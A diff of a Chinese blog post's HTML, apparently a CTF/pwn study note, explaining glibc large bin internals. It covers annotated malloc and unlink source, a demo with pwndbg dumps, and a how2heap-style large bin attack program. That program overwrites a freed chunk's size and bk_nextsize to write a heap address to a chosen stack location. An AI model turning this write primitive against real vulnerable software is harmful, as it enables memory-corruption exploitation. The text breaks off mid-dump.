+          //如果对应的 bin 为空或者其中的chunk最大的也很小，那就跳过
+          if ((victim = first (bin)) != bin &amp;&amp;
+              (unsigned long) (victim-&gt;size) &gt;= (unsigned long) (nb))
+            {
+              // 反向遍历链表，找到第一个比size大的chunk
+              victim = victim-&gt;bk_nextsize;
+              while (((unsigned long) (size = chunksize (victim)) &lt;
+                      (unsigned long) (nb)))
+                victim = victim-&gt;bk_nextsize;
+
+              /* Avoid removing the first entry for a size so that the skip
+                 list does not have to be rerouted.  */
+              //如果取出的chunk不是bin的最后一个chunk，同时该chunk的纵向列表不为空
+              //它就会取它前面的那个chunk
+              //因为大小相同的chunk只有一个会被串在nextsize链上
+              //这可以避免额外的bk_nextsize和fd_nextsize的赋值
+              if (victim != last (bin) &amp;&amp; victim-&gt;size == victim-&gt;fd-&gt;size)
+                victim = victim-&gt;fd;
+              //计算切割后的大小
+              remainder_size = size - nb;
+              unlink (av, victim, bck, fwd);//通过unlink将chunk从链表移除
+
+              /* Exhaust */
+              if (remainder_size &lt; MINSIZE)
+                {
+                  //如果切割后的大小不足以作为一个chunk，那么就会将其标志位设为inuse
+                  //同时设置NO_main_arena标志位
+                  set_inuse_bit_at_offset (victim, size);
+                  if (av != &amp;main_arena)
+                    victim-&gt;size |= NON_MAIN_ARENA;
+                }
+              /* Split */
+              else
+                {
+                  //如果剩余的大小可以作为一个chunk
+                  //获得剩余部分的地址，放入unsorted bin中
+                  remainder = chunk_at_offset (victim, nb);
+                  /* We cannot assume the unsorted list is empty and therefore
+                     have to perform a complete insert here.  */
+                  bck = unsorted_chunks (av);
+                  fwd = bck-&gt;fd;
+      if (__glibc_unlikely (fwd-&gt;bk != bck))
+                    {
+                      errstr = &quot;malloc(): corrupted unsorted chunks&quot;;
+                      goto errout;
+                    }
+                  remainder-&gt;bk = bck;
+                  remainder-&gt;fd = fwd;
+                  bck-&gt;fd = remainder;
+                  fwd-&gt;bk = remainder;
+                  if (!in_smallbin_range (remainder_size))
+                    {
+                      remainder-&gt;fd_nextsize = NULL;
+                      remainder-&gt;bk_nextsize = NULL;
+                    }
+                  set_head (victim, nb | PREV_INUSE |
+                            (av != &amp;main_arena ? NON_MAIN_ARENA : 0));
+                  set_head (remainder, remainder_size | PREV_INUSE);
+                  set_foot (remainder, remainder_size);
+                }
+              check_malloced_chunk (av, victim, nb);
+              void *p = chunk2mem (victim);
+              alloc_perturb (p, bytes);
+              return p;
+            }
+        }
+</code></pre>
 <p>unlink的源码：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            \</span></span><br><span class="line">    FD = P-&gt;fd;								      \</span><br><span class="line">    BK = P-&gt;bk;								      \</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))		      \</span><br><span class="line">      malloc_printerr (check_action, <span class="string">"corrupted double-linked list"</span>, P, AV);  \</span><br><span class="line">    <span class="keyword">else</span> &#123;								      \</span><br><span class="line">        FD-&gt;bk = BK;							      \</span><br><span class="line">        BK-&gt;fd = FD;							      \</span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range (P-&gt;size)				      \</span><br><span class="line">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;		      \</span><br><span class="line">	    <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)	      \</span><br><span class="line">		|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))    \</span><br><span class="line">	      malloc_printerr (check_action,				      \</span><br><span class="line">			       <span class="string">"corrupted double-linked list (not small)"</span>,    \</span><br><span class="line">			       P, AV);					      \</span><br><span class="line">            <span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;				      \</span><br><span class="line">                <span class="keyword">if</span> (P-&gt;fd_nextsize == P)				      \</span><br><span class="line">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;		      \</span><br><span class="line">                <span class="keyword">else</span> &#123;							      \</span><br><span class="line">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;			      \</span><br><span class="line">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;			      \</span><br><span class="line">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;			      \</span><br><span class="line">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;			      \</span><br><span class="line">                  &#125;							      \</span><br><span class="line">              &#125; <span class="keyword">else</span> &#123;							      \</span><br><span class="line">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;		      \</span><br><span class="line">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;		      \</span><br><span class="line">              &#125;								      \</span><br><span class="line">          &#125;								      \</span><br><span class="line">      &#125;									      \</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="c">#define unlink(AV, P, BK, FD) {                                            \
+    FD = P-&gt;fd;                                      \
+    BK = P-&gt;bk;                                      \
+    if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))              \
+      malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P, AV);  \
+    else {                                      \
+        FD-&gt;bk = BK;                                  \
+        BK-&gt;fd = FD;                                  \
+        if (!in_smallbin_range (P-&gt;size)                      \
+            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) {              \
+        if (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0)          \
+        || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0))    \
+          malloc_printerr (check_action,                      \
+                   &quot;corrupted double-linked list (not small)&quot;,    \
+                   P, AV);                          \
+            if (FD-&gt;fd_nextsize == NULL) {                      \
+                if (P-&gt;fd_nextsize == P)                      \
+                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;              \
+                else {                                  \
+                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;                  \
+                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;                  \
+                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;                  \
+                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;                  \
+                  }                                  \
+              } else {                                  \
+                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;              \
+                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;              \
+              }                                      \
+          }                                      \
+      }                                          \
+}
+</code></pre>
 <p>对largebin的chunk会多了对fd_nextsize和bk_nextsize的检查，原理和fd、bk是一样的</p>
 <p>一个小demo：(from <a href="https://dangokyo.me/2018/04/07/a-revisit-to-large-bin-in-glibc/" target="_blank" rel="noopener">大佬的博客</a>)</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *p1, *p2, *p3, *p4, *p5, *p6, *p7, *p8, *p9, *p10;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *p;</span><br><span class="line">    p1 = <span class="built_in">malloc</span>(<span class="number">0x3f0</span>);</span><br><span class="line">    p2 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    p3 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">    p4 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    p5 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">    p6 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    p7 = <span class="built_in">malloc</span>(<span class="number">0x120</span>);</span><br><span class="line">    p8 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    p9 = <span class="built_in">malloc</span>(<span class="number">0x140</span>);</span><br><span class="line">    p10 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    <span class="built_in">free</span>(p7);</span><br><span class="line">    <span class="built_in">free</span>(p9);</span><br><span class="line"> </span><br><span class="line">    p = <span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line">    p = <span class="built_in">malloc</span>(<span class="number">0xb0</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">free</span>(p1);</span><br><span class="line">    <span class="built_in">free</span>(p3);</span><br><span class="line">    <span class="built_in">free</span>(p5);</span><br><span class="line"> </span><br><span class="line">    p = <span class="built_in">malloc</span>(<span class="number">0x110</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="c">#include&lt;stdio.h&gt;
+#include&lt;stdlib.h&gt;
+int main()
+{
+    unsigned long *p1, *p2, *p3, *p4, *p5, *p6, *p7, *p8, *p9, *p10;
+    unsigned long *p;
+    p1 = malloc(0x3f0);
+    p2 = malloc(0x20);
+    p3 = malloc(0x400);
+    p4 = malloc(0x20);
+    p5 = malloc(0x400);
+    p6 = malloc(0x20);
+    p7 = malloc(0x120);
+    p8 = malloc(0x20);
+    p9 = malloc(0x140);
+    p10 = malloc(0x20);
+    free(p7);
+    free(p9);
+
+    p = malloc(0x60);
+    p = malloc(0xb0);
+
+    free(p1);
+    free(p3);
+    free(p5);
+
+    p = malloc(0x110);
+
+    return 0;
+}
+</code></pre>
 <p>在free掉p7和p9后，会将这两个chunk插入unsorted bin中。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">unsortedbin</span><br><span class="line">all: 0x602cb0 —▸ 0x7ffff7dd1b78 (main_arena+88) —▸ 0x602e10 ◂— 0x602cb0</span><br></pre></td></tr></table></figure>
-<p>然后malloc(0x60)会将p7 切割，然后剩余的部分会放在unsorted bin中，而p9会被放到对应的smallbin中</p>
+<pre><code>unsortedbin
+all: 0x602cb0 —▸ 0x7ffff7dd1b78 (main_arena+88) —▸ 0x602e10 ◂— 0x602cb0
+</code></pre><p>然后malloc(0x60)会将p7 切割，然后剩余的部分会放在unsorted bin中，而p9会被放到对应的smallbin中</p>
 <p>之后free掉三个largebin大小的chunk，这三个chunk都会被放如unsorted bin中</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">unsortedbin</span><br><span class="line">all: 0x602430 —▸ 0x602000 —▸ 0x7ffff7dd1b78 (main_arena+88) —▸ 0x602870 ◂— 0x602430 /* &apos;0$`&apos; */</span><br></pre></td></tr></table></figure>
-<p>之后malloc一个大小为0x110的chunk，使得unsorted bin 中的chunk被放入相应的bin中</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">largebins</span><br><span class="line">0x400: 0x602870 —▸ 0x602000 —▸ 0x7ffff7dd1f68 (main_arena+1096) —▸ 0x602430 ◂— 0x602870 /* &apos;p(`&apos; */</span><br><span class="line"></span><br><span class="line">0x602000 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0x0, </span><br><span class="line">  size = 0x401, </span><br><span class="line">  fd = 0x7ffff7dd1f68 &lt;main_arena+1096&gt;, </span><br><span class="line">  bk = 0x602870, </span><br><span class="line">  fd_nextsize = 0x602430, </span><br><span class="line">  bk_nextsize = 0x602430</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">0x602430 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0x0, </span><br><span class="line">  size = 0x411, </span><br><span class="line">  fd = 0x602870, </span><br><span class="line">  bk = 0x7ffff7dd1f68 &lt;main_arena+1096&gt;, </span><br><span class="line">  fd_nextsize = 0x602000, </span><br><span class="line">  bk_nextsize = 0x602000</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">0x602870 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0x0, </span><br><span class="line">  size = 0x411, </span><br><span class="line">  fd = 0x602000, </span><br><span class="line">  bk = 0x602430, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>可以发现largebin中的 chunk按照从大到小的顺序，大的chunk在前面，小的在后面。并且相同大小的chunk构成一条链表，并且0x602870对应的chunk 没有设置bk_nextsize 和 fd_nextszie，它仅通过fd和bk与0x602000和0x602430形成链表。</p>
+<pre><code>unsortedbin
+all: 0x602430 —▸ 0x602000 —▸ 0x7ffff7dd1b78 (main_arena+88) —▸ 0x602870 ◂— 0x602430 /* &#39;0$`&#39; */
+</code></pre><p>之后malloc一个大小为0x110的chunk，使得unsorted bin 中的chunk被放入相应的bin中</p>
+<pre><code>largebins
+0x400: 0x602870 —▸ 0x602000 —▸ 0x7ffff7dd1f68 (main_arena+1096) —▸ 0x602430 ◂— 0x602870 /* &#39;p(`&#39; */
+
+0x602000 PREV_INUSE {
+  prev_size = 0x0, 
+  size = 0x401, 
+  fd = 0x7ffff7dd1f68 &lt;main_arena+1096&gt;, 
+  bk = 0x602870, 
+  fd_nextsize = 0x602430, 
+  bk_nextsize = 0x602430
+}
+
+0x602430 PREV_INUSE {
+  prev_size = 0x0, 
+  size = 0x411, 
+  fd = 0x602870, 
+  bk = 0x7ffff7dd1f68 &lt;main_arena+1096&gt;, 
+  fd_nextsize = 0x602000, 
+  bk_nextsize = 0x602000
+}
+
+0x602870 PREV_INUSE {
+  prev_size = 0x0, 
+  size = 0x411, 
+  fd = 0x602000, 
+  bk = 0x602430, 
+  fd_nextsize = 0x0, 
+  bk_nextsize = 0x0
+}
+</code></pre><p>可以发现largebin中的 chunk按照从大到小的顺序，大的chunk在前面，小的在后面。并且相同大小的chunk构成一条链表，并且0x602870对应的chunk 没有设置bk_nextsize 和 fd_nextszie，它仅通过fd和bk与0x602000和0x602430形成链表。</p>
 <h3 id="large-bin-attack原理"><a href="#large-bin-attack原理" class="headerlink" title="large bin attack原理"></a>large bin attack原理</h3><h4 id="往任意地址写堆地址"><a href="#往任意地址写堆地址" class="headerlink" title="往任意地址写堆地址"></a>往任意地址写堆地址</h4><p>how2heap上的largebin attack</p>
 <p>涉及到的libc源码：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">     victim-&gt;fd_nextsize = fwd;</span><br><span class="line">     victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">     fwd-&gt;bk_nextsize = victim;</span><br><span class="line">     victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">&#125;</span><br><span class="line">bck = fwd-&gt;bk;</span><br></pre></td></tr></table></figure>
+<pre><code class="c">else
+{
+     victim-&gt;fd_nextsize = fwd;
+     victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;
+     fwd-&gt;bk_nextsize = victim;
+     victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;
+}
+bck = fwd-&gt;bk;
+</code></pre>
 <p>造成的原因：没有对被插入的chunk进行检查</p>
 <p>源码：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *p1, *p2, *p3, *p4, *p5, *p6, *p7, *p8, *p9, *p10, *p11, *p12;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *p;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="built_in">stack</span>[<span class="number">8</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"stack address: %p\n"</span>, &amp;<span class="built_in">stack</span>);</span><br><span class="line">    p1 = <span class="built_in">malloc</span>(<span class="number">0x3f0</span>);</span><br><span class="line">    p2 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    p3 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">    p4 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    p5 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">    p6 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    p7 = <span class="built_in">malloc</span>(<span class="number">0x120</span>);</span><br><span class="line">    p8 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    p9 = <span class="built_in">malloc</span>(<span class="number">0x140</span>);</span><br><span class="line">    p10 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    p11 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">    p12 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    <span class="built_in">free</span>(p7);</span><br><span class="line">    <span class="built_in">free</span>(p9);</span><br><span class="line"> </span><br><span class="line">    p = <span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line">    p = <span class="built_in">malloc</span>(<span class="number">0xb0</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">free</span>(p1);</span><br><span class="line">    <span class="built_in">free</span>(p3);</span><br><span class="line">    <span class="built_in">free</span>(p5);</span><br><span class="line"> </span><br><span class="line">    p = <span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">free</span>(p11);</span><br><span class="line"> </span><br><span class="line">    *(p3<span class="number">-1</span>) = <span class="number">0x3f1</span>;</span><br><span class="line">    *(p3) = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;<span class="built_in">stack</span>);</span><br><span class="line">    *(p3+<span class="number">1</span>) = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;<span class="built_in">stack</span>);</span><br><span class="line">    *(p3+<span class="number">2</span>) = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;<span class="built_in">stack</span>);</span><br><span class="line">    *(p3+<span class="number">3</span>) = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;<span class="built_in">stack</span>);</span><br><span class="line">    <span class="comment">// trigger malicious malloc</span></span><br><span class="line">    p = <span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="c">#include&lt;stdio.h&gt;
+#include&lt;stdlib.h&gt;
+
+int main()
+{
+    unsigned long *p1, *p2, *p3, *p4, *p5, *p6, *p7, *p8, *p9, *p10, *p11, *p12;
+    unsigned long *p;
+    unsigned long stack[8] = {0};
+    printf(&quot;stack address: %p\n&quot;, &amp;stack);
+    p1 = malloc(0x3f0);
+    p2 = malloc(0x20);
+    p3 = malloc(0x400);
+    p4 = malloc(0x20);
+    p5 = malloc(0x400);
+    p6 = malloc(0x20);
+    p7 = malloc(0x120);
+    p8 = malloc(0x20);
+    p9 = malloc(0x140);
+    p10 = malloc(0x20);
+    p11 = malloc(0x400);
+    p12 = malloc(0x20);
+    free(p7);
+    free(p9);
+
+    p = malloc(0x60);
+    p = malloc(0xb0);
+
+    free(p1);
+    free(p3);
+    free(p5);
+
+    p = malloc(0x60);
+
+    free(p11);
+
+    *(p3-1) = 0x3f1;
+    *(p3) = (unsigned long)(&amp;stack);
+    *(p3+1) = (unsigned long)(&amp;stack);
+    *(p3+2) = (unsigned long)(&amp;stack);
+    *(p3+3) = (unsigned long)(&amp;stack);
+    // trigger malicious malloc
+    p = malloc(0x60);
+
+    return 0;
+}
+</code></pre>
 <p>通过某种溢出修改largebin 中的chunk的size，使其变小，小于之前free掉 在unsorted bin中的 large chunk，并且往bk和bk_nextsize字段填入栈地址。那么当再次malloc时，会将p11插入largebin 的头部。经过插入后，会往目标栈地址写入p11的地址。这个可以用来往任意地址写一个不可控的值，类似与unsorted bin attack。</p>
 <p>此时p11的内容</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; chunkinfo 0x6033a0</span><br><span class="line">==================================</span><br><span class="line">            Chunk info            </span><br><span class="line">==================================</span><br><span class="line">Status :  Freed </span><br><span class="line">Unlinkable : True</span><br><span class="line">Result of unlink :</span><br><span class="line">       FD-&gt;bk (*0x602858) = BK (0x6033a0 -&gt; 0x7fffffffdd10) </span><br><span class="line">       BK-&gt;fd (*0x7fffffffdd20) = FD (0x6033a0 -&gt; 0x602840) </span><br><span class="line">Freeable : false -&gt; Double free chunkaddr(0x6033a0) inused bit is not seted )</span><br><span class="line">prev_size : 0x0                  </span><br><span class="line">size : 0x410                  </span><br><span class="line">prev_inused : 1                    </span><br><span class="line">is_mmap : 0                    </span><br><span class="line">non_mainarea : 0                     </span><br><span class="line">fd : 0x602840                  </span><br><span class="line">bk : 0x7fffffffdd10                  </span><br><span class="line">fd_nextsize : 0x602840  </span><br><span class="line">bk_nextsize : 0x7fffffffdd10</span><br></pre></td></tr></table></figure>
-<p>目标栈地址内容：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x7fffffffdd10</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffffffdd20</span>:	<span class="number">0x00000000006033a0</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffffffdd30</span>:	<span class="number">0x00000000006033a0</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffffffdd40</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>
+<pre><code>pwndbg&gt; chunkinfo 0x6033a0
+==================================
+            Chunk info            
+==================================
+Status :  Freed 
+Unlinkable : True
+Result of unlink :
+       FD-&gt;bk (*0x602858) = BK (0x6033a0 -&gt; 0x7fffffffdd10) 
+       BK-&gt;fd (*0x7fffffffdd20) = FD (0x6033a0 -&gt; 0x602840) 
+Freeable : false -&gt; Double free chunkaddr(0x6033a0) inused bit is not seted )
+prev_size : 0x0                  
+size : 0x410                  
+prev_inused : 1                    
+is_mmap : 0                    
+non_mainarea : 0                     
+fd : 0x602840                  
+bk : 0x7fffffffdd10                  
+fd_nextsize : 0x602840  
+bk_nextsize : 0x7fffffffdd10  
+
+</code></pre><p>目标栈地址内容：</p>
+<pre><code class="c">0x7fffffffdd10:    0x0000000000000000    0x0000000000000000
+0x7fffffffdd20:    0x00000000006033a0    0x0000000000000000
+0x7fffffffdd30:    0x00000000006033a0    0x0000000000000000
+0x7fffffffdd40:    0x0000000000000000    0x0000000000000000
+</code></pre>
 <p>具体实现的操作</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">victim = p11  <span class="comment">//0x6033a0</span></span><br><span class="line">fwd = p3 <span class="comment">//0x602840</span></span><br><span class="line">操作前的victim</span><br><span class="line">pwndbg&gt; x/<span class="number">10</span>gx <span class="number">0x6033a0</span></span><br><span class="line"><span class="number">0x6033a0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000411</span></span><br><span class="line"><span class="number">0x6033b0</span>:	<span class="number">0x0000000000603290</span>	<span class="number">0x00007ffff7dd1b78</span></span><br><span class="line"><span class="number">0x6033c0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6033d0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6033e0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">进行下面的操作</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">     victim-&gt;fd_nextsize = fwd;</span><br><span class="line">     victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">     fwd-&gt;bk_nextsize = victim;</span><br><span class="line">     victim-&gt;bk_nextsize-&gt;fd_nextsize = victim; <span class="comment">// 这一步会往stack上写入victim的地址</span></span><br><span class="line">&#125;</span><br><span class="line">bck = fwd-&gt;bk;</span><br><span class="line"></span><br><span class="line">操作完后victim的内容</span><br><span class="line">pwndbg&gt; 